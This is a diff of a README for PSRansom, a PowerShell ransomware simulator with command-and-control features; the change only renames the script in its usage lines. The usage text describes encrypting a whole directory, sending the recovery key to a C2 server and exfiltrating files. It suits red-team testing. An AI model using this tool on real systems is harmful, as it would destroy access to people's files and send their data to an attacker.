@@ -32,11 +32,11 @@ git clone https://github.com/JoelGMSec/PSRansom
  Info:  This tool helps you simulate encryption process of a
         generic ransomware in PowerShell with C2 capabilities
 
- Usage: .\RansomShell.ps1 -e Directory -s C2Server -p C2Port
+ Usage: .\PSRansom.ps1 -e Directory -s C2Server -p C2Port
           Encrypt all files & sends recovery key to C2Server
           Use -x to exfiltrate and decrypt files on C2Server
 
-        .\RansomShell.ps1 -d Directory -k RecoveryKey
+        .\PSRansom.ps1 -d Directory -k RecoveryKey
           Decrypt all files with recovery key string
 
  Warning: All info will be sent to the C2Server without any encryption
